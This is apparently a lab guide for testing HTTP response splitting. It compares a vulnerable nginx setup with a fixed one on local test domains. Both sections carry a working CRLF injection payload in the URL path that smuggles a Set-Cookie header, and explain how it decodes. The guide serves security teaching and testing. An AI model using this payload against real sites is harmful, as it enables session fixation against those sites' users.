# Instructions for HTTP Response Splitting testing

## Vulnerable example

1. Start nginx container
    - See instructions: TODO
2. Make GET requests to following paths
   - You can use incognito window to have a clean start 
   ```
   # This is a path without payload
   $ http://whaleback.test.local:90/valaat/whales/1
   
   # This path contains a payload part
   $ http://whaleback.test.local:90/valaat/whales/2%0d%0aSet-Cookie%3Asessiontoken%3D123ABC%3Bpath%3D%2F
   
   # The payload: %0d%0aSet-Cookie%3Asessiontoken%3D123ABC%3Bpath%3D%2F
   # %0d%0a = URL encoded "\r\n" (CRLF)
   # Set-Cookie%3Asessiontoken%3D123ABC%3Bpath%3D%2F = URL encoded "Set-Cookie:sessiontoken=123ABC;path=/" 
   
   # The payload sets a cookie "sessiontoken" with value "123ABC" and sets the path for that cookie to be "/" 
   ```
3. Observe the results
   - Check the cookies before running the first GET request
   - See what kind of requests the browser makes
   - Check what headers the responses of the requests have
   - Check the cookies after the GET request with payload has been sent
4. Make a new GET request to a different path like following and observe the results: 
   ```
   # Use this path
   $ http://whaleback.test.local:90/echorequest
   ```
   - Notice that the request has the cookie set which we set with the request with the payload


## Invulnerable example

1. Start nginx container
    - See instructions: TODO
2. Make GET requests to following paths
   - You can use incognito window to have a clean start 
   ```
   # This is a path without payload
   $ http://catback.test.mau:91/kissat/cats/1
   
   # This path contains a payload part
   $ http://catback.test.mau:91/kissat/cats/2%0d%0aSet-Cookie%3Asessiontoken%3D123ABC%3Bpath%3D%2F
   
   # The payload: %0d%0aSet-Cookie%3Asessiontoken%3D123ABC%3Bpath%3D%2F
   # %0d%0a = URL encoded "\r\n" (CRLF)
   # Set-Cookie%3Asessiontoken%3D123ABC%3Bpath%3D%2F = URL encoded "Set-Cookie:sessiontoken=123ABC;path=/" 
   
   # The payload does not set a cookie 
   ```
3. Observe the results
   - Check the cookies before running the first GET request
   - See what kind of requests the browser makes
   - Check what headers the responses of the requests have
   - Check the cookies after the GET request with payload has been sent
4. Make a new GET request to a different path like following and observe the results: 
   ```
   # Use this path
   $ http://catback.test.mau:91/echorequest
   ```
   - Notice that the request has no cookie set









































































